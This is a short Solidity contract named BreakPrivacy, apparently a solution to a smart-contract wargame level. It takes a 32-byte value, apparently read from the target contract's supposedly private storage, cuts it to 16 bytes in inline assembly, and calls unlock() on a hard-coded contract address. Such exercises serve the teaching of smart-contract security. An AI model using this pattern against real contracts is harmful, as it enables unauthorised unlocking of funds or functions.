// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BreakPrivacy {
    Privacy public privacy;

    constructor() {
        privacy = Privacy(address(0x73DB580736001Dc6AA30E6E31be577d6A74C1119));
    }

    function getKeyAndUnlock(bytes32 _data) public {
        bytes16 _key = _getHalfBytes(_data);
        privacy.unlock(_key);
    }

    function _getHalfBytes(bytes32 source) private pure returns (bytes16) {
        bytes16[2] memory y = [bytes16(0), 0];
        assembly {
            mstore(y, source)
            mstore(add(y, 16), source)
        }
        return y[0];
    }
}

interface Privacy {
    function unlock(bytes16 _key) external;
}
